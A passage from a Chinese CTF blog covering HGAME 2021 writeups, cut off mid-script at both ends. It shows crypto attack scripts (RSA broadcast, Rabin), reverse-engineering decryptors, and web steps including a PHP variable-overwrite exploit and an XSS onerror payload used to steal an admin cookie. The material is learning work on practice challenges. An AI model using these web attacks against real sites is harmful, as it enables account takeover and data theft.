class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">a1 = [<span class="number">0</span>] * <span class="number">36</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    a1[i] = Int(<span class="string">&#x27;a1[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">v3 = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">v2 = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">v4 = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">v3[<span class="number">0</span>] = <span class="number">55030</span></span><br><span class="line">v3[<span class="number">1</span>] = <span class="number">61095</span></span><br><span class="line">v3[<span class="number">2</span>] = <span class="number">60151</span></span><br><span class="line">v3[<span class="number">3</span>] = <span class="number">57247</span></span><br><span class="line">v3[<span class="number">4</span>] = <span class="number">56780</span></span><br><span class="line">v3[<span class="number">5</span>] = <span class="number">55726</span></span><br><span class="line">v3[<span class="number">6</span>] = <span class="number">46642</span></span><br><span class="line">v3[<span class="number">7</span>] = <span class="number">52931</span></span><br><span class="line">v3[<span class="number">8</span>] = <span class="number">53580</span></span><br><span class="line">v3[<span class="number">9</span>] = <span class="number">50437</span></span><br><span class="line">v3[<span class="number">10</span>] = <span class="number">50062</span></span><br><span class="line">v3[<span class="number">11</span>] = <span class="number">44186</span></span><br><span class="line">v3[<span class="number">12</span>] = <span class="number">44909</span></span><br><span class="line">v3[<span class="number">13</span>] = <span class="number">46490</span></span><br><span class="line">v3[<span class="number">14</span>] = <span class="number">46024</span></span><br><span class="line">v3[<span class="number">15</span>] = <span class="number">44347</span></span><br><span class="line">v3[<span class="number">16</span>] = <span class="number">43850</span></span><br><span class="line">v3[<span class="number">17</span>] = <span class="number">44368</span></span><br><span class="line">v3[<span class="number">18</span>] = <span class="number">54990</span></span><br><span class="line">v3[<span class="number">19</span>] = <span class="number">61884</span></span><br><span class="line">v3[<span class="number">20</span>] = <span class="number">61202</span></span><br><span class="line">v3[<span class="number">21</span>] = <span class="number">58139</span></span><br><span class="line">v3[<span class="number">22</span>] = <span class="number">57730</span></span><br><span class="line">v3[<span class="number">23</span>] = <span class="number">54964</span></span><br><span class="line">v3[<span class="number">24</span>] = <span class="number">48849</span></span><br><span class="line">v3[<span class="number">25</span>] = <span class="number">51026</span></span><br><span class="line">v3[<span class="number">26</span>] = <span class="number">49629</span></span><br><span class="line">v3[<span class="number">27</span>] = <span class="number">48219</span></span><br><span class="line">v3[<span class="number">28</span>] = <span class="number">47904</span></span><br><span class="line">v3[<span class="number">29</span>] = <span class="number">50823</span></span><br><span class="line">v3[<span class="number">30</span>] = <span class="number">46596</span></span><br><span class="line">v3[<span class="number">31</span>] = <span class="number">50517</span></span><br><span class="line">v3[<span class="number">32</span>] = <span class="number">48421</span></span><br><span class="line">v3[<span class="number">33</span>] = <span class="number">46143</span></span><br><span class="line">v3[<span class="number">34</span>] = <span class="number">46102</span></span><br><span class="line">v3[<span class="number">35</span>] = <span class="number">46744</span></span><br><span class="line">v2[<span class="number">0</span>] = <span class="number">104</span></span><br><span class="line">v2[<span class="number">1</span>] = <span class="number">103</span></span><br><span class="line">v2[<span class="number">2</span>] = <span class="number">97</span></span><br><span class="line">v2[<span class="number">3</span>] = <span class="number">109</span></span><br><span class="line">v2[<span class="number">4</span>] = <span class="number">101</span></span><br><span class="line">v2[<span class="number">5</span>] = <span class="number">123</span></span><br><span class="line">v2[<span class="number">6</span>] = <span class="number">64</span></span><br><span class="line">v2[<span class="number">7</span>] = <span class="number">95</span></span><br><span class="line">v2[<span class="number">8</span>] = <span class="number">70</span></span><br><span class="line">v2[<span class="number">9</span>] = <span class="number">65</span></span><br><span class="line">v2[<span class="number">10</span>] = <span class="number">75</span></span><br><span class="line">v2[<span class="number">11</span>] = <span class="number">69</span></span><br><span class="line">v2[<span class="number">12</span>] = <span class="number">95</span></span><br><span class="line">v2[<span class="number">13</span>] = <span class="number">102</span></span><br><span class="line">v2[<span class="number">14</span>] = <span class="number">108</span></span><br><span class="line">v2[<span class="number">15</span>] = <span class="number">97</span></span><br><span class="line">v2[<span class="number">16</span>] = <span class="number">103</span></span><br><span class="line">v2[<span class="number">17</span>] = <span class="number">33</span></span><br><span class="line">v2[<span class="number">18</span>] = <span class="number">45</span></span><br><span class="line">v2[<span class="number">19</span>] = <span class="number">100</span></span><br><span class="line">v2[<span class="number">20</span>] = <span class="number">111</span></span><br><span class="line">v2[<span class="number">21</span>] = <span class="number">95</span></span><br><span class="line">v2[<span class="number">22</span>] = <span class="number">89</span></span><br><span class="line">v2[<span class="number">23</span>] = <span class="number">48</span></span><br><span class="line">v2[<span class="number">24</span>] = <span class="number">117</span></span><br><span class="line">v2[<span class="number">25</span>] = <span class="number">95</span></span><br><span class="line">v2[<span class="number">26</span>] = <span class="number">107</span></span><br><span class="line">v2[<span class="number">27</span>] = <span class="number">111</span></span><br><span class="line">v2[<span class="number">28</span>] = <span class="number">110</span></span><br><span class="line">v2[<span class="number">29</span>] = <span class="number">119</span></span><br><span class="line">v2[<span class="number">30</span>] = <span class="number">95</span></span><br><span class="line">v2[<span class="number">31</span>] = <span class="number">83</span></span><br><span class="line">v2[<span class="number">32</span>] = <span class="number">77</span></span><br><span class="line">v2[<span class="number">33</span>] = <span class="number">67</span></span><br><span class="line">v2[<span class="number">34</span>] = <span class="number">63</span></span><br><span class="line">v2[<span class="number">35</span>] = <span class="number">125</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">            v4[<span class="number">6</span> * i + j] += v2[<span class="number">6</span> * k + j] * a1[<span class="number">6</span> * i + k]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">        s.add(v4[<span class="number">6</span>*i+j] == v3[<span class="number">6</span> * i + j])</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">result = s.model()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">36</span>):</span><br><span class="line">     <span class="built_in">print</span>(result[a1[i]], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="1-LikiPrime"><a href="#1-LikiPrime" class="headerlink" title="1.LikiPrime"></a>1.LikiPrime</h3><p>​    还是 RSA，不过素数 N 更大了，但是放到网站里分解还是能分解出 q和 p，之后就是用上周的脚本跑出flag</p><h3 id="2-HappyNewYear"><a href="#2-HappyNewYear" class="headerlink" title="2.HappyNewYear!!"></a>2.HappyNewYear!!</h3><p>​    e = 3，发送内容相同，自然就想到低指数广播攻击，但是广播攻击只需要 e组数据，那么猜测给的数据里解出来的明文不是全部相同。</p><p>​    低指数广播攻击需要用到中国剩余定理（孙子定理），脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(gmpy2.invert(gmpy2.mpz(a), gmpy2.mpz(m)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chinese_remainder</span>(<span class="params">n, a</span>):</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    prod = reduce(<span class="keyword">lambda</span> a, b: a * b, n)</span><br><span class="line">    <span class="keyword">for</span> n_i, a_i <span class="keyword">in</span> <span class="built_in">zip</span>(n, a):</span><br><span class="line">        p = prod // n_i</span><br><span class="line">        <span class="built_in">sum</span> += a_i * modinv(p, n_i) * p</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">sum</span> % prod)</span><br><span class="line"></span><br><span class="line">n1 = </span><br><span class="line">c1 = </span><br><span class="line"></span><br><span class="line">n2 = </span><br><span class="line">c2 = </span><br><span class="line"></span><br><span class="line">n3 = </span><br><span class="line">c3 = </span><br><span class="line"></span><br><span class="line">n4 = </span><br><span class="line">c4 = </span><br><span class="line"></span><br><span class="line">n5 = </span><br><span class="line">c5 =</span><br><span class="line"></span><br><span class="line">n6 = </span><br><span class="line">c6 = </span><br><span class="line"></span><br><span class="line">n7 = </span><br><span class="line">c7 = </span><br><span class="line"></span><br><span class="line">nset = [n2,n4,n6]</span><br><span class="line">cset = [c2,c4,c6]</span><br><span class="line"></span><br><span class="line">m = chinese_remainder(nset, cset)</span><br><span class="line">m = gmpy2.iroot(m,<span class="number">3</span>)</span><br><span class="line">m = <span class="built_in">int</span>(m[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(n2s(m))</span><br></pre></td></tr></table></figure><p>c1,c3,c5 解密得到一个片段，c2,c4,c6解密得到剩下的flag片段（本来写的是随机在给出的7组数据里挑三组解密，但是没跑出结果，后来手动试了一下试出来了）</p><img src="/2021/03/27/HGAME-Week3-Writeup/crypto3(2).jpg" class=""><img src="/2021/03/27/HGAME-Week3-Writeup/crypto3.jpg" class=""><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-A-R-K"><a href="#1-A-R-K" class="headerlink" title="1.A R K"></a>1.A R K</h3><p>​        打开下载的流量包，首先看到dns里的域名</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc1(5).jpg" class=""><p>​        刚开始以为跟网址有关，但后来题目里说 “<strong>本题目所有解题操作均只用流量，与网址无关</strong>” ，那就接着看其他包，查资料知道 TLS 加密尝试找到流量包里的证书</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc1(4).png" class=""><p>​        导出原始数据保存为 ssl.log ,再重新导入解密</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc1(6).jpg" class=""><p>​        找到解密后的 HTTP 流，导出后得到一堆json文件，导出来后卡了一段时间，之后看到题目的补充信息</p><p>​    <code>补充说明：明日方舟是一款塔防游戏，可以将可部署单位放置在场地中。并且具有自律功能，可以记录部署的操作。      翻译：没用 没用 出题人用可部署单位画了个东西 背景是白色的</code></p><p>​        <strong>记录部署操作</strong>？！那就打开 getBattleReplay 文件，看到像是 base64 编码的字符串，解码看到 zip 文件头标识另存为 zip，解压打开发现配对的 row 和 col ，应该是部署的坐标，再根据题目里的 <strong>画了个东西</strong> 猜测这些坐标是二维码黑色部分，处理一下再运行脚本</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc1(7).jpg" class=""><p>​        扫码得flag</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc1(2).png" class=""><h3 id="2-A-R-C"><a href="#2-A-R-C" class="headerlink" title="2.A R C"></a>2.A R C</h3><p>​    压缩包加密了，那就先看图片找密码</p><img src="/2021/03/27/HGAME-Week3-Writeup/8558.png" class=""><p>​    刚开始误以为 BV 是某种 CTF 中的加密方式，在网上搜索了一圈没有收获，于是去问 Akira 学长 BV 除了 b站BV号还有什么意思，学长的答复是</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc2(5).png" class=""><p>​    怎么实现的？查 av号怎样转 bv号后发现 <a href="https://www.zhihu.com/question/381784377/answer/1099438784">https://www.zhihu.com/question/381784377/answer/1099438784</a> 这个回答里的实现方法，根据 <strong>hint1：8558 应该理解成85和58，BV号_是所以图片里的是__</strong>    先对图里的密文进行 base85 解密</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc2.png" class=""><p>​    根据长度判断应该是 av号转 bv号算法里的table，那就换一下上面链接里代码的table，密文是压缩包名里的数字，跑一下得到压缩包密码</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc2(2).png" class=""><p>​    打开后得到一段 arc 视频和密文，用题目里给的软件播放视频得到</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc2(3).png" class=""><p>​    发现图中第一行文字和文本里文字相似，猜测是同种加密方式，之后又没有思路了，hint2里提到 <strong>词频分析是个好东西，别忘了视频里的问题</strong> ，查了下视频里的问题但没什么发现。后来又放出hint <strong>用了某种ROT的范围，但是位移不一样</strong> ，根据两个字符的应该是 is 之类的尝试将每个字符后移10位，得到了一段英文，然后又卡住了。于是又去问 Akira学长，学长说并不是后移10位提示我再想想视频里问题的答案，突然想起之前有查到 42 这个数字，尝试后移42位得到正确的文字</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc2(4).png" class=""><p>​    视频里文字第一行也是后移 42位得到 MSU 密码，解密得到的文字里提到视频里第二行的加密方法 Liki学长提到过，根据 week1 crypto的第一题，第二行文字加密方法应该是维吉尼亚，密钥是 Akira</p><p>​    在 virtualDub2里安装MSUstego插件，用之前得到的密码对视频进行解密，得到网址、光和对立的名字，访问网站输入用户名和密码</p><img src="/2021/03/27/HGAME-Week3-Writeup/misc2(7).png" class=""><p>​    根据hint5: <strong>/ 不是可输入的意思，是网站路径</strong>，想起之前视频解出的第二行还没用上，那就在网站路径后输入解出的明文，得到flag（pm）</p><p>​    这周misc虽然难但很有趣，梗挺多的</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>​    这周因为跟父母回老家拜年少了很多做题的时间，之后电脑还出了故障重装了系统，下周要专注于re了，不能再靠着 misc 和 crypto 上分了</p><p>接下来是没做出来的部分</p><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><p>​    Gun这道题用查壳工具查得是梆梆免费版加固，想要脱壳，用了很多网上查到的方法但都失败了，问了 Trotsky学长，推荐使用frida-dexdump脱壳，但是因为这道题需要root过的真机（模拟器不行）来进行脱壳，所以最后只能放弃</p><p>​    hello_re3我没太搞明白，拖进ida发现应该都是调试信息，mezone学长说要用dbgview看调试信息再定位到程序里，可惜这题是最后一天才做的，最后没时间了，打算看官方writeup再学习一下</p><h3 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h3><p>​    EncryptedChats这题尝试了各种方法去解，还是解不出 a 和 b ，需要的时间都很长，但是 g 挺大（不是2、5这种很小的） a 跟 b 应该是能解出来的…</p>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;Week3&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    <category term="Hgame2021" scheme="https://www.0wl.site/categories/Hgame2021/"/>
    
    
    <category term="hgame" scheme="https://www.0wl.site/tags/hgame/"/>
    
  </entry>
  
  <entry>
    <title>HGAME-Week2-Writeup</title>
    <link href="https://www.0wl.site/2021/03/27/HGAME-Week2-Writeup/"/>
    <id>https://www.0wl.site/2021/03/27/HGAME-Week2-Writeup/</id>
    <published>2021-03-27T06:43:36.000Z</published>
    <updated>2021-11-16T14:53:38.912Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>Week2</p></div></article><span id="more"></span><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-LazyDogR4U"><a href="#1-LazyDogR4U" class="headerlink" title="1.LazyDogR4U"></a>1.LazyDogR4U</h3><p>​        首先打开题目地址</p><img src="/2021/03/27/HGAME-Week2-Writeup/web1(2).png" class=""><p>​        根据题目给的hint，在地址栏后面加上 <strong>/<a href="http://www.zip/">www.zip</a></strong> 获得网页源码</p><p>​        接着打开 lazy.php 和 flag.php 这两个php文件，再根据<strong>变量覆盖</strong>的提示找到漏洞点</p><img src="/2021/03/27/HGAME-Week2-Writeup/web1(3).png" class=""><p>​        这里划线处的两个$符号容易导致变量覆盖，那么根据 flag.php 中得到flag的条件就可以进行构造，相当于：          $_SESSSION[username]=admin</p><img src="/2021/03/27/HGAME-Week2-Writeup/web1(4).png" class=""><p>​        双写SESSION是因为上面str_replace的过滤</p><img src="/2021/03/27/HGAME-Week2-Writeup/web1.png" class=""><p>​        得到flag</p><h3 id="2-Post-to-zuckonit"><a href="#2-Post-to-zuckonit" class="headerlink" title="2.Post to zuckonit"></a>2.Post to zuckonit</h3><p>​        <img src="/2021/03/27/HGAME-Week2-Writeup/web(6).png" class=""></p><p>​        点开后发现是留言板，题目也很明确的指出是<strong>xss</strong>，那么就先尝试输入 script，iframe，image</p><p>​        输入后发现不管大小写 script 都会被过滤掉，小写的 iframe 会被过滤，image则不会被过滤</p><p>​        之后尝试输入 img src=1 onerror = alert(1) ，让错误的图片导致弹窗</p><img src="/2021/03/27/HGAME-Week2-Writeup/web2(6).png" class=""><p>​        输出了这么个东西，把这个输入再 post 就会弹窗，成功弹窗之后就是找一个 xss 平台来接受 cookie 信息</p><img src="/2021/03/27/HGAME-Week2-Writeup/web2(4).png" class=""><p>​        根据之前的规律 post 平台给的语句，并用脚本得出 md5 验证码提交，接收到 cookie 信息</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span>():</span></span><br><span class="line">    code = <span class="string">&#x27;XXXXXX&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>, <span class="number">99999999</span>):   <span class="comment">#8位md5</span></span><br><span class="line">        <span class="keyword">if</span> md5(<span class="built_in">str</span>(i)).startswith(code):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_code())</span><br></pre></td></tr></table></figure><img src="/2021/03/27/HGAME-Week2-Writeup/web(2).png" class=""><p>​        接着就伪造 admin cookie 得到flag</p><img src="/2021/03/27/HGAME-Week2-Writeup/web2.png" class=""><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="1-ezApk"><a href="#1-ezApk" class="headerlink" title="1.ezApk"></a>1.ezApk</h3><p>​        <strong>安卓逆向</strong>，用 jadx 反编译为 java，找到 onClick 事件</p><img src="/2021/03/27/HGAME-Week2-Writeup/re1(4).png" class=""><p>​        这条判断语句是关键，在资源文件中找到加密后的 flag 和 key</p><img src="/2021/03/27/HGAME-Week2-Writeup/re1.jpg" class=""><p>​        s函数用来加密输入的字符串，转到s函数分析</p><img src="/2021/03/27/HGAME-Week2-Writeup/re1(5).png" class=""><p>​        仔细分析后得知是<strong>AES CBC模式</strong>加密，密钥是之前的key经过<strong>sha-256</strong>加密得到的，iv向量则是key经过<strong>MD5</strong>加密得到的，最后将加密结果再进行一次 <strong>base64</strong> 加密得到之前的 flag</p><p>​        尝试用在线网站解密，但是网站一般只支持 16 位 iv 值解密，没有别的办法只能东拼西凑写出 java 脚本来解密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//md5,sha-256加密</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] t(String str, String str2) &#123;</span><br><span class="line">        MessageDigest instance = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            instance = MessageDigest.getInstance(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = str2.getBytes();</span><br><span class="line">        <span class="keyword">byte</span>[] digest = instance.digest(bytes);</span><br><span class="line">        <span class="keyword">return</span> digest;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//解密</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">desEncrypt</span><span class="params">(String data, <span class="keyword">byte</span>[] key)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] ivString = t(<span class="string">&quot;MD5&quot;</span>,<span class="string">&quot;A_HIDDEN_KEY&quot;</span>); <span class="comment">//iv向量</span></span><br><span class="line">        <span class="keyword">byte</span>[] iv = ivString;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] encryp = Base64.getDecoder().decode(data);</span><br><span class="line">            Cipher cipher =           Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS7Padding&quot;</span>);</span><br><span class="line">            SecretKeySpec keySpec = <span class="keyword">new</span> SecretKeySpec(key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            IvParameterSpec ivSpec = <span class="keyword">new</span> IvParameterSpec(iv);</span><br><span class="line">            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);</span><br><span class="line">            <span class="keyword">byte</span>[] original = cipher.doFinal(encryp);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> String(original);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String data = <span class="string">&quot;EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY&quot;</span>;     <span class="comment">//密文</span></span><br><span class="line">        <span class="keyword">byte</span>[] key =t(<span class="string">&quot;SHA-256&quot;</span>,<span class="string">&quot;A_HIDDEN_KEY&quot;</span>);  <span class="comment">//密钥</span></span><br><span class="line">        String desencrypt = desEncrypt(data, key);</span><br><span class="line">        System.out.println(<span class="string">&quot;解密后:&quot;</span>+desencrypt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        因为要用到的是AES 256位解密，而 java 本身只支持 128位 AES 解密，所以就要做其他的一些配置才能解密</p><img src="/2021/03/27/HGAME-Week2-Writeup/re1(3).png" class=""><h3 id="2-helloRe2"><a href="#2-helloRe2" class="headerlink" title="2.helloRe2"></a>2.helloRe2</h3><p>​        拖进 IDA 分析，乍一看结构有点复杂，password1 的判断在后半部分，而password2 的判断在前半部分，先分析 password1</p><img src="/2021/03/27/HGAME-Week2-Writeup/re2(3).png" class=""><p>​        关键部分是这条判断，判断输入的password长度和 password 经过一系列操作后的结果，用 ollydbg 调试并不断猜测，得知这么一系列操作就是判断输入的字符串是否是给出的密文的逆序</p><p>​        之后再分析 pwd2 </p><img src="/2021/03/27/HGAME-Week2-Writeup/re2.png" class=""><p>​        应该又是AES CBC 模式加密，找到 iv 和 密钥，密钥是pwd1经过异或得到，密文是已经给出密文的逆序</p><p>![](D:\HGAME2021\HGAME week2\re2(4).png)</p><img src="/2021/03/27/HGAME-Week2-Writeup/re2(5).png" class=""><p>​        解密就用上一题的脚本</p><img src="/2021/03/27/HGAME-Week2-Writeup/re2(1).png" class=""><img src="/2021/03/27/HGAME-Week2-Writeup/re2(6).png" class=""><p>​        这里看着像是两次加密，但其实只有一次</p><img src="/2021/03/27/HGAME-Week2-Writeup/re2(2).png" class=""><h3 id="3-fake-debugger-beta"><a href="#3-fake-debugger-beta" class="headerlink" title="3.fake_debugger beta"></a>3.fake_debugger beta</h3><p>​        nc题目地址，发现只有在 ebx 经过一次转换后与 eax 相等才能继续调试，之后不断调试发现</p><img src="/2021/03/27/HGAME-Week2-Writeup/re3.png" class=""><p>​        转换前的 ebx 与 eax 异或后就是 flag 中的字符，那就一个个调试下来得到 flag</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="1-gcd-or-more"><a href="#1-gcd-or-more" class="headerlink" title="1.gcd or more?"></a>1.gcd or more?</h3><p>​        <img src="/2021/03/27/HGAME-Week2-Writeup/crypto2.png" class=""></p><p>​        看着像是RSA，但是e = 2。百度后查到低指数爆破，之后又看到Rabin算法，特征是e = 2 ，那么就用这个脚本解题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line">p = <span class="number">85228565021128901853314934583129083441989045225022541298550570449389839609019</span></span><br><span class="line">q = <span class="number">111614714641364911312915294479850549131835378046002423977989457843071188836271</span></span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="number">7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#c= int(open(&#x27;./flag.enc&#x27;,&#x27;rb&#x27;).read().encode(&#x27;hex&#x27;),16)</span></span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">yp = gmpy2.invert(p, q)</span><br><span class="line">yq = 